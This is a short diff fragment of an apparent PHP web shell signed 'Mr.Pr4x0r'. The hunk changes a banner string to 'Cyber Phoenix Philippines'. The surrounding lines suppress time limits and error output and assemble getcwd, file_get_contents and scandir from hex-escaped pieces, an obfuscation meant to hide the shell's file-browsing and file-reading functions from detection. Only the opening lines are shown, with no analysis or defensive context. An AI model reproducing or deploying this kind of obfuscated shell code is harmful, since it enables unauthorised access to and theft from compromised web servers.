@@ -4,7 +4,7 @@ set_time_limit(0);
 error_reporting(0);
 error_log(0);
 
-$sname       = "$argon2id$v=19$m=65536,t=4,p=1$R0VMaE9iczI1L2I1TEhZYw$DaqFmf13S0AkzyfbtLRJQKNpCK2hgN1Ff9Ya5zDMKiU" . " - Mr.Pr4x0r";
+$sname       = "Cyber Phoenix Philippines" . " - Mr.Pr4x0r";
 $__gcdir     = "\x67" . "\x65\x74\x63\x77\x64";
 $__fgetcon7s = "\x66\x69\x6c\x65" . "\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
 $__scdir     = "s" . "\x63\x61\x6e\x64\x69" . "r";
